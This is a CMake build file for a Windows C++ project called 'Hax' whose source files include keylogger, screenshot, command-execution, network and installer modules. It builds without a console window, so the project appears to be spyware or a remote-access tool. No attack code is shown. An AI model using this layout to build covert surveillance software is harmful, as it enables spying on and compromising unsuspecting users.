cmake_minimum_required(VERSION 2.6)
project(Hax)

set(SRC
    src/CommandExe.cpp
    src/CommandExe.h
    src/Hax.cpp
    src/Hax.h
    src/Info.cpp
    src/Info.h
    src/Installer.cpp
    src/Installer.h
    src/Keylogger.cpp
    src/Keylogger.h
    src/Network.cpp
    src/Network.h
    src/Screenshot.cpp
    src/Screenshot.h
    src/stdafx.cpp
    src/stdafx.h
    src/targetver.h
    src/Util.cpp
    src/Util.h
)

set(LIBS
    secur32.lib
    ws2_32.lib
)

add_executable(Hax ${SRC})
target_link_libraries(Hax ${LIBS})

if(MSVC)
    set_target_properties(Hax PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS")
endif()
